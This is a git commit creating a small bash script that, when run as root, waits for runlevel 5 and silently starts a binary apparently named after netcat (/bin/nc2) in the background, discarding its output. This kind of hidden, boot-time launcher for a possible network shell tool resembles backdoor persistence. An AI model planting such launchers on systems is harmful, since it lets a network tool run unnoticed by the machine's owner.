d15dd588b79ec7a1643a465dcc0a2da1425ba74c
ibnusaja <45093115+ibnusaja@users.noreply.github.com>
2023-04-07 22:05:07 +0800

    Create runnc2.sh

---
+++ linux/runnc2.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+if [[ "$(id -u)" != "0" ]];then
+ echo "    GAGAL !!!,kamu harus dalam mode root"
+ exit 0
+fi
+
+while [ "$(who -r | awk '{print $2}')" != "5" ]; do sleep 1; done
+
+
+# nohup /bin/nc2 > /home/kali/Desktop/logNC.txt 2> /home/kali/Desktop/logNC.txt &
+nohup /bin/nc2 > /dev/null 2> /dev/null &
+exit 0
